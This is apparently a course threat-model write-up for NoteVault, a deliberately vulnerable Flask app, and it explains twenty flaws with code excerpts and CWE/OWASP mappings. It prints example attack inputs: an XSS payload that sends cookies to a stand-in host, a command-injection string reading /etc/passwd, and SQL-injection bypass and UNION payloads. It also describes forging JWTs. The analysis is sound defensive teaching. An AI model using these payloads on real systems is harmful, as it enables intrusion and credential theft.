# Problems in plain language — NoteVault

> **Read this file first**, then move on to `02-dataflow.md` → `03-stride.md`.
> The idea: start from "what can an attacker actually do?" in everyday words.
>
> **Each problem has three blocks:**
>
> - **What it is** — the meaning in plain language
> - **In the code** — the vulnerable lines verbatim, then what they do wrong
> - **Links** — mapping to DFD element, STRIDE row, course week, CWE, OWASP 2025
>
> **Index:** Ch.1 Auth & takeover → P-01–P-04 · Ch.2 Broken authorization →
> P-05–P-07 · Ch.3 Injection → P-08–P-09 · Ch.4 Amplifiers → P-10–P-15 ·
> Ch.5 Build & runtime → P-16–P-20 · [Master mapping table](#master-mapping-table-problem--dfd--stride--course--cwe--owasp-2025)
>
> **ID note:** `P-01`–`P-20` are *problem* numbers in this file. `P1`–`P7`
> (with no dash) are *process* IDs inside the DFD — different namespaces.
> Every Links line scopes them explicitly as `DFD: …`.
>
> OWASP references use **Top 10:2025** numbering as taught in the course
> (Injection=A05, Supply Chain=A03, Misconfiguration=A02, Crypto=A04,
> Logging=A09 — these differ from the 2021 list).

---

## Chapter 1 — Authentication & account takeover (W6, W10) *Getting in without any password.*

### P-01 · Sign up and just *ask* to be admin

**What it is:** The registration form only *shows* username + password, but the
server blindly trusts every field the client sends. Slip an extra `role=admin`
into the request and it creates an admin account for you — like writing
"position: president" on a club application and having it stamped as-is.

**In the code:** `app.py:114`
```python
role = request.form.get("role") or (request.json or {}).get("role") or "user"
con.execute("INSERT INTO users (username, password, role) VALUES (?,?,?)",
            (username, hashlib.md5(password.encode()).hexdigest(), role))
```
`role` comes straight from the request body and lands in the database
unchanged — there is no allow-list of permitted fields and no server-side
default overriding it, so the client decides its own privilege level.

**Links:** `POST /register` · DFD: P1, F1 · STRIDE row 3 · **W10 mass assignment (API3)** · CWE-915/266 · OWASP A01:2025

### P-02 · Register "admin" a second time — also works

**What it is:** The database never checks that usernames are unique, so you can
register `admin` again with a password *you* chose. At login the query matches
your row and issues a token `sub=admin` — and the role lookup returns the
*real* admin's role. Privilege escalation without even touching the `role`
field.

**In the code:** `app.py:64`, `app.py:91`
```python
"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT);"
```
```python
r = con.execute("SELECT role FROM users WHERE username = ?", (username,)).fetchone()
```
No `UNIQUE` constraint on `username`, so a second `admin` row inserts happily.
Then `role_of()`'s `fetchone()` returns the *first* row named `admin` — the
original, privileged one — so your new account inherits real admin rights.

**Links:** `POST /register` + login flow · DFD: P1, D1 · STRIDE row 3 · **W6 authz design** · CWE-269 · OWASP A01:2025

### P-03 · Forge your own "entry pass" — the stamp is printed on the blueprint

**What it is:** The session token is like a laminated badge, and the secret
used to stamp it is printed inside the building blueprint — `SECRET` is a
committed constant. Anyone who reads the source can mint a homemade HS256
token with `sub=admin` and walk in. Verified: a forged token returns the full
`/admin` hash dump. (The `algorithms` list also whitelists `"none"`, but PyJWT
itself rejects unsigned tokens when a key is passed — `InvalidKeyError` — so
the working attack is key theft, not `alg=none`.)

**In the code:** `app.py:23`, `app.py:83`
```python
SECRET = "notevault-dev-secret"  # used to sign session tokens
```
```python
data = jwt.decode(tok, SECRET, algorithms=["HS256", "none"])
```
`SECRET` is committed to source, so anyone who reads the code can re-sign
`sub=admin` — confirmed live. Whitelisting `"none"` is still an
insecure-algorithm smell (CWE-347) but not a working bypass on PyJWT 1.7.1.

**Links:** `current_user()` · DFD: D3, F2/F3 · STRIDE row 4 · **W6 JWT pitfalls** · CWE-321 (hardcoded key), CWE-347 · OWASP A07:2025

### P-04 · Type a "magic spell" into the login box and walk through

**What it is:** The login check is a sentence built out of your input. Entering
`alice'--` as the username makes `'` close the string and `--` comment out the
whole password condition — you log in as alice with no password, like answering
a secret question with words that erase the question itself.

**In the code:** `app.py:128-129`
```python
q = "SELECT * FROM users WHERE username = '%s' AND password = '%s'" % (
    username, hashlib.md5((password or "").encode()).hexdigest())
row = con.execute(q).fetchone()
```
The SQL is assembled with `%` string formatting *before* reaching the
database — so an attacker-supplied `'` escapes the string literal and becomes
part of the query's grammar. This is a text-built interpreter string, the
exact anti-pattern parameterized queries exist to prevent.

**Links:** `POST /login` · DFD: P1·F5·TB2 · STRIDE row 3 · **W4 SQLi auth bypass** · CWE-89 · OWASP A05:2025

---

## Chapter 2 — Broken authorization & data exposure (W6, W10) *Once inside, everyone's data is readable.*

### P-05 · Change the number in the URL, read someone else's note

**What it is:** `/api/notes/1` is yours — so what is `/api/notes/2`? The server
only asks "are you logged in?", never "is this note *yours*?". Ids are
sequential, so you can stroll through the whole table — including admin's
`infra` note ("prod db password is hunter2") and the `build-tag` marker.

**In the code:** `app.py:163-166`
```python
if not current_user():
    return jsonify(error="auth required"), 401
r = con.execute("SELECT id,owner,title,body FROM notes WHERE id = ?", (nid,)).fetchone()
```
Gate 1 (authentication) runs — but Gate 2 (authorization) never does: the
query has no `AND owner = <current_user>` condition, so any valid token reads
any note object.

**Links:** `GET /api/notes/<id>` · DFD: P6·F4·TB2 · STRIDE row 6 · **W6 IDOR / W10 BOLA (API1)** · CWE-639 · OWASP A01:2025 / API1

### P-06 · The search box is a vacuum for the entire database

**What it is:** The search field isn't just a search field — it talks straight
to the database in SQL. Feed it a crafted UNION payload and the `users` table
(everyone's password hashes) comes back dressed as "search results".

**In the code:** `app.py:178`
```python
q = "SELECT id,title,body FROM notes WHERE owner='%s' AND body LIKE '%%%s%%'" % (user, term)
rows = con.execute(q).fetchall()
```
Both interpolations are raw string formatting. A `q` like
`' UNION SELECT id,username,password FROM users--` closes the LIKE, appends a
second query over `users`, and every row is rendered to the page.

**Links:** `GET /search` · DFD: P3·F4·TB2 · STRIDE row 7 · **W4 UNION SQLi** · CWE-89 · OWASP A05:2025

### P-07 · Reach admin → the server hands out *everyone's* password hash

**What it is:** The admin panel doesn't just list usernames — it dumps the
`password` column (MD5 hashes) for every account as JSON. Data that should
never leave the database leaks through an official endpoint (excessive data
exposure).

**In the code:** `app.py:191`
```python
rows = con.execute("SELECT id,username,password,role FROM users").fetchall()
return jsonify([dict(r) for r in rows])
```
The `SELECT` pulls the `password` hash column and the response serializes the
full row — there is no DTO/allow-list trimming the sensitive field out before
it crosses the wire.

**Links:** `GET /admin` · DFD: P4·F6·F9·TB1 · STRIDE row 8 · **W10 API3/BOPLA** · CWE-200/359 · OWASP API3:2023

---

## Chapter 3 — Injection: server & browser (W4, W5) *Making the server work for us.*

### P-08 · `/export` runs real OS commands — RCE

**What it is:** The export feature hands your input to the operating system's
command interpreter. Ask for `fmt=txt;cat /etc/passwd` and the server runs your
command as **root** inside the container — read env secrets (`APP_SECRET`,
`TEAM_SALT`), alter files, or go further. The single most dangerous hole in
the app.

**In the code:** `app.py:202-203`
```python
out = subprocess.run("echo exporting notes as " + fmt, shell=True,
                     capture_output=True, text=True)
return "<pre>%s</pre>" % out.stdout
```
`shell=True` passes the whole string to `/bin/sh`, so `;`, `|`, `$()` and
backticks inside `fmt` are parsed as shell syntax — and `capture_output` even
returns your command's output in the response.

**Links:** `GET /export` · DFD: P5→P7·F7·**TB3** · STRIDE row 9 · **W4 command injection** · CWE-78 · OWASP A05:2025

### P-09 · Plant a trap inside a note — anyone who reads it gets caught

**What it is:** You can store a live trap in a note. Write
`<script>fetch('//evil/'+document.cookie)</script>` as the body — the page
renders it as real code, so every logged-in viewer executes your script in
their browser and mails you their session cookie (amplified by P-13).

**In the code:** `app.py:43`, `app.py:104-106`, `app.py:181-182`
```python
<h3>Your notes</h3>{{ notes_html|safe }}
```
```python
notes_html = "".join(
    "<li>#%d <b>%s</b>: %s</li>" % (r["id"], r["title"], r["body"]) for r in rows)
```
`|safe` explicitly disables Jinja's autoescaping, and `notes_html` is built by
concatenating raw `title`/`body` into tags — so stored markup is rendered as
HTML, not shown as text. `/search` repeats the same raw-concatenation pattern.

**Links:** `GET /` + `GET /search` · DFD: P2/P3·F4 · STRIDE row 5 · **W5 stored XSS** · CWE-79 · OWASP A05:2025

---

## Chapter 4 — Amplifying weaknesses (W3, W5, W10) *Amplifiers — small alone, devastating in combination with Chapters 1–3.*

### P-10 · Passwords hashed with bare MD5, no salt

**What it is:** MD5 is a fast, decades-old hash with public rainbow tables —
anyone who gets a hash (via P-06/P-07/P-08) cracks `admin123` or `alicepw` in
seconds with hashcat + rockyou.

**In the code:** `app.py:68`, `app.py:117`
```python
("alice", hashlib.md5(b"alicepw").hexdigest(), "user"),
```
```python
hashlib.md5(password.encode()).hexdigest()
```
A single unsalted MD5 pass — identical passwords hash identically, and a fast
hash means billions of guesses per second offline. The fix is a slow salted
KDF (argon2id/bcrypt), not a "better" fast hash.

**Links:** `users.password` · DFD: D1 · STRIDE row 11 · **W3 Capture the Hash** · CWE-916/327 · OWASP A04:2025

### P-11 · Unlimited password guesses

**What it is:** The login door has no bouncer — try as many passwords as you
like, as fast as you like. Combined with weak hashing (P-10) it's
guess-until-you're-in; other endpoints are unbounded too → resource exhaustion.

**In the code:** `app.py:123-137`
```python
row = con.execute(q).fetchone()
con.close()
if not row:
    return "login failed", 401
```
There is no attempt counter, lockout, delay, or throttle anywhere in the
handler (or app) — every request gets a fresh, unrestricted query.

**Links:** `POST /login` · DFD: P1·F1·TB1 · STRIDE row 2 · **W10 API4** · CWE-307 · OWASP API4:2023

### P-12 · Entry pass never expires — and logout doesn't kill it

**What it is:** The session token is a keycard with no expiry date — steal it
once, use it forever. And it's stateless: "logout" only deletes the browser's
copy; the token itself keeps working, like a photocopied keycard that still
opens the door after you hand back the original.

**In the code:** `app.py:134`, `app.py:141-144`
```python
tok = jwt.encode({"sub": username}, SECRET, algorithm="HS256")
```
```python
resp = make_response(redirect("/"))
resp.delete_cookie("session")
```
The payload contains only `sub` — no `exp` or `aud` claim to bound its
lifetime — and logout just removes the client-side cookie; the signed token
remains cryptographically valid forever.

**Links:** session lifecycle · DFD: D3·F2/F3 · STRIDE row 4 · **W6 sessions** · CWE-613 · OWASP A07:2025

### P-13 · Cookie readable by JavaScript + no Secure/SameSite

**What it is:** The session cookie is left lying in the open — any script can
read `document.cookie`, it travels over plain HTTP, and the browser will
attach it to requests from other sites. This is what turns P-09's XSS into
instant session theft.

**In the code:** `app.py:136`
```python
resp.set_cookie("session", tok)
```
No `HttpOnly` (JS can read it), no `Secure` (sent over HTTP), no `SameSite`
(attached cross-site) — all three flags are simply absent.

**Links:** session cookie · DFD: D3 · STRIDE row 4 · **W5 cookie flags** · CWE-1004/614 · OWASP A05/A07:2025

### P-14 · Everything rides plain HTTP — eavesdroppers welcome

**What it is:** No TLS anywhere — every credential and session cookie travels
as readable text; anyone sharing the network path can simply listen.

**In the code:** `app.py:209`, `docker-compose.yml:5-6`
```python
app.run(host="0.0.0.0", port=8080, debug=True)
```
```yaml
ports:
  - "8080:8080"
```
The Flask server speaks plain HTTP on 8080 and compose exposes it directly —
there is no TLS terminator anywhere in front.

**Links:** flows F1/F3 · DFD: TB1 · STRIDE row 1 · **W3/W5 transport** · CWE-319 · OWASP A04:2025

### P-15 · No CSRF tokens — other sites can issue requests as you

**What it is:** Any page the victim visits can silently submit forms to
NoteVault — the browser attaches the session cookie automatically, and the
server can't tell the request wasn't intended.

**In the code:** `app.py:147-155`
```python
@app.route("/notes", methods=["POST"])
def add_note():
    user = current_user()
    if not user:
        return "auth required", 401
```
State-changing POSTs (`/notes`, `/login`, `/register`) accept bare form
submissions — no CSRF token verification and no Origin/Referer check anywhere.

**Links:** all POST endpoints · DFD: F1/F3·TB1 · STRIDE row 3 (noted in secondary) · **W5 CSRF** · CWE-352 · OWASP A01:2025

---

## Chapter 5 — Build, runtime & supply chain (W12, W13, W15) *The box and machinery around the app.*

### P-16 · Debug mode left on in "production"

**What it is:** The app ships with its mechanic's toolkit attached — the
Werkzeug debugger leaks detailed stack traces on errors and exposes an
interactive console that can become a second RCE path, plus auto-reload.

**In the code:** `app.py:209`
```python
app.run(host="0.0.0.0", port=8080, debug=True)
```
`debug=True` enables the debugger's traceback pages and interactive console on
every error — information disclosure by default, remote code execution if the
console is reachable.

**Links:** runtime config · DFD: P0·TB4 · STRIDE row 12 · **W2/W15 fail-safe** · CWE-489/215 · OWASP A02:2025

### P-17 · The Dockerfile breaks nearly every rule (vs W13 Misconfig Hunt)

**What it is:** The shipping container the app lives in is mislabeled and
unlocked — it runs as root, carries a secret printed on the box, and nobody
pinned down what's inside.

**In the code:** `Dockerfile`
```dockerfile
FROM python:3.12
ENV APP_SECRET=notevault-dev-secret
WORKDIR /app
COPY . .
RUN pip install -r requirements.txt
```
Five defects: (1) no `USER` → process runs as **root**; (2) `ENV` bakes a
secret into the image layer — `docker history` shows it in plain text; (3)
`FROM python:3.12` is a floating tag, not a pinned digest; (4) `COPY . .`
drags the whole build context in (`.dockerignore` covers `.env`, still too
wide); (5) `pip install` without `--require-hashes` accepts whatever resolves.

**Links:** `Dockerfile` · DFD: TB4·D4 · STRIDE row 12 · **W13 container hardening** · CWE-250 (root), CWE-798 (secret), CWE-1357 · OWASP A02:2025

### P-18 · Every dependency is old — known CVEs

**What it is:** The app is built from library parts with published, documented
flaws — an attacker doesn't need to find a new bug, they can read the manual
on how to break the parts we ship.

**In the code:** `requirements.txt`
```text
Flask==2.0.1
Werkzeug==2.0.1
Jinja2==3.0.1
PyJWT==1.7.1
requests==2.25.1
urllib3==1.26.4
```
Every pin is an old version with published advisories — e.g. PyJWT 1.7.1's
key-confusion (CVE-2022-29217) and Werkzeug 2.0.1 advisories. Phase 2 confirmed
the vulnerable baseline with pip-audit; the captured output is in
`evidence/F-14.txt`.

**Links:** `requirements.txt` · DFD: TB4 · STRIDE row 12 · **W12 SCA** · CWE-1395 · OWASP A03:2025

### P-19 · Nothing is logged — get breached and never know

**What it is:** The building has no CCTV — failed logins, denied access,
attack noise, all invisible. You can't repudiate what never got recorded, and
you can't detect an attack you can't see. OWASP counts this as a real finding,
not a missing feature.

**In the code:** `app.py:12-19` (the entire import block)
```python
import hashlib
import hmac
import os
import sqlite3
import subprocess
import jwt
from flask import Flask, request, jsonify, render_template_string, redirect, make_response
```
No `logging` import, no `app.logger`, no audit trail anywhere — the absence
itself is the finding; there is literally nothing to review after an incident.

**Links:** whole app · DFD: P0 · STRIDE: R applies to every row · **W15 logging/alerting** · CWE-778 · OWASP A09:2025

### P-20 · Every restart wipes all data

**What it is:** The app erases its own filing cabinet every time it boots —
anyone who can crash it (or an ops restart) destroys everything. An
availability risk built into the design.

**In the code:** `app.py:63`, `app.py:208`
```python
con.executescript(
    "DROP TABLE IF EXISTS users; DROP TABLE IF EXISTS notes; ..."
)
```
```python
if __name__ == "__main__":
    seed()
    app.run(host="0.0.0.0", port=8080, debug=True)
```
`seed()` unconditionally drops both tables on *every* start — there is no
"only if empty" check and no persistent volume, so data never survives a
restart.

**Links:** startup routine · DFD: D1/D2 · STRIDE row 10 (D) · **design/availability** · CWE-664 · OWASP A06:2025

---

## Master mapping table (problem → DFD → STRIDE → course → CWE → OWASP 2025)

| # | Problem (plain words) | DFD | STRIDE | Course | CWE | OWASP 2025 | Risk |
|---|---|---|---|---|---|---|---|
| P-01 | Self-made admin at signup | P1·F1·TB1 | E | W10 | 915/266 | A01 + API3 | High |
| P-02 | Duplicate "admin" allowed | P1·D1 | E,S | W6 | 269 | A01 | High |
| P-03 | Forged JWT (hardcoded key) | D3·F2/F3 | S,T,E | W6 | 321/347 | A07 | High |
| P-04 | SQLi login bypass | P1·F5·TB2 | T,S,E | W4 | 89 | A05 | Critical |
| P-05 | IDOR — read others' notes | P6·F4 | I | W6/W10 | 639 | A01 + API1 | High |
| P-06 | SQLi dumps whole DB | P3·F4·TB2 | T,I | W4 | 89 | A05 | Critical |
| P-07 | /admin leaks all hashes | P4·F6·F9 | I | W10 | 200/359 | API3 | High |
| P-08 | RCE via /export | P5→P7·F7·TB3 | T,I,E,D | W4 | 78 | A05 | Critical |
| P-09 | Stored XSS steals sessions | P2·F4 | T,I | W5 | 79 | A05 | High |
| P-10 | Unsalted MD5 passwords | D1 | I | W3 | 916/327 | A04 | High |
| P-11 | No rate limiting | P1·F1 | S,D | W10 | 307 | API4 | Medium |
| P-12 | Token never expires / can't revoke | D3 | S | W6 | 613 | A07 | Medium |
| P-13 | Cookie missing flags | D3 | I,S | W5 | 1004/614 | A05/A07 | Medium |
| P-14 | Plain HTTP, no TLS | TB1 | I | W3 | 319 | A04 | Medium |
| P-15 | No CSRF protection | F1/F3 | — | W5 | 352 | A01 | Medium |
| P-16 | debug=True | P0·TB4 | I,E | W2 | 489/215 | A02 | High |
| P-17 | Dockerfile misconfigs ×5 | TB4·D4 | I,E | W13 | 250/798/1357 | A02 | High |
| P-18 | Vulnerable dependencies | TB4 | (all) | W12 | 1395 | A03 | per CVE |
| P-19 | No logging at all | P0 | R | W15 | 778 | A09 | Medium |
| P-20 | seed() wipes on restart | D1/D2 | D | design | 664 | A06 | Low |

## Checked — confirmed absent (not forgotten)

- **File upload / path traversal** — the app has no upload feature (taught in
  W1/W4, but there is no surface to attack)
- **XXE / deserialization** — no XML/pickle input anywhere
- **SSRF / open redirect** — no URL fetching or input-driven redirect
  (`redirect("/")` is a fixed literal)
- **SSTI via user input** — `render_template_string` renders a *fixed*
  template; user input goes through as data, not template (XSS exists; SSTI
  does not)
- **GraphQL / LLM features** — none (W14 is n/a for this app; the API Top 10 is
  used instead where relevant)
- **Memory-safety issues (W11)** — the app is Python; out of scope by design
- **IAM / cloud misconfiguration** — no cloud resources (only the container
  half of W13 applies)
